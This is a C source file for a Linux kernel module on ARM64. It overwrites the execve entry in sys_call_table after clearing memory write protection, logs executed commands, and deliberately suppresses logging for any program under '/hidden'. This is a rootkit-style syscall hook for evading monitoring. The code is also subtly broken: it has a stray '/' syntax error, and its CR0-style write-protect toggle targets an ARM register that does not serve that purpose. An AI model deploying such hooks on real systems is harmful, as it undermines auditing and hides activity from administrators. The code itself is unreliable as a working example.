#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>

#define __NR_execve 221  // syscall no in ARM 64

static unsigned long *sys_call_table; //ptr to store address of sys_call_table

asmlinkage long (*orig_execve)(const char __user *filename,
                                const char __user *const __user *argv,
                                const char __user *const __user *envp);// to store the original syscall

asmlinkage long hooked_execve(const char __user *filename,
                               const char __user *const __user *argv,
                               const char __user *const __user *envp)// costum syscall to be hook
{

char filename_buf[256];
    // Copy the filename from user space
    if (copy_from_user(filename_buf, filename, sizeof(filename_buf))) {
        return -EFAULT;
    }

    // Ensure filename is null-terminated
    filename_buf[sizeof(filename_buf) - 1] = '\0';

    // Check if the filename starts with "/hidden"
    if (strncmp(filename_buf, "/hidden", 7) == 0) {
        /* Prevent logging
         suppressing  mechanism */

        return orig_execve(filename, argv, envp);
    }

    // Log the command if it does not start with "/hidden"
    printk(KERN_INFO "execve() syscall hooked: filename=%s\n", filename_buf);

    // Call the original execve syscall
    return orig_execve(filename, argv, envp);
}

// directly copied from resource https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
static inline unsigned long read_cr0(void)
{
    unsigned long val;
    asm volatile("mrs %0, S3_0_C15_C0_0" : "=r"(val));
    return val;
}

static inline void write_cr0(unsigned long val)
{
    asm volatile("msr S3_0_C15_C0_0, %0" : : "r"(val));
}

static void unprotect_memory(void) // unproctect memory to add custom syscall
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000);
}

static void protect_memory(void) // protect memory 
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 | 0x10000);
}

static int __init my_module_init(void) /
{
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table"); //sys_call_table_address is been store in ptr
    if (!sys_call_table)
    {
        printk(KERN_ERR "Failed to locate sys_call_table\n");
        return -1;
    }

   
    orig_execve = (void *)sys_call_table[__NR_execve]; //original syscall is been stored
    printk(KERN_INFO "Original execve syscall address: %lx\n", (unsigned long)orig_execve);

  
    unprotect_memory();
    sys_call_table[__NR_execve] = (unsigned long)hooked_execve;//custom syscall is been stored into memory
    protect_memory();

    printk(KERN_INFO "Successfully hooked execve syscall\n");
    return 0;
}

static void __exit my_module_exit(void)
{
    
    unprotect_memory();
    sys_call_table[__NR_execve] = (unsigned long)orig_execve; //original syscall is been restored
    protect_memory();

    printk(KERN_INFO "Restored original execve syscall\n");
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("VEDANT");
